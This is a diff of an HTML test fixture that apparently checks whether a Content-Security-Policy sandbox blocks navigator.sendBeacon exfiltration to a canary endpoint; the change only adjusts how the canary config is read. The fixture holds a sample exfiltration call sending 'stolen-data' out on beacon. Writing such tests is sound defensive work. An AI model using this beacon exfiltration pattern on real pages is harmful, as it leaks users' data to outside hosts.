@@ -4,7 +4,7 @@
 <!-- ATTACK: navigator.sendBeacon, the API purpose-built for exfil-on-unload.
      Governed by connect-src 'none'. Canary must stay silent. -->
 <script>
-  const canary = (window.bridge.getArgs() || {}).canary || {};
+  const canary = ((window.bridge.getArgs() || {}).args || {}).canary || {};
   const r = { attack: 'sendbeacon' };
   try {
     r.returned = navigator.sendBeacon(canary.http + '/beacon', 'stolen-data');
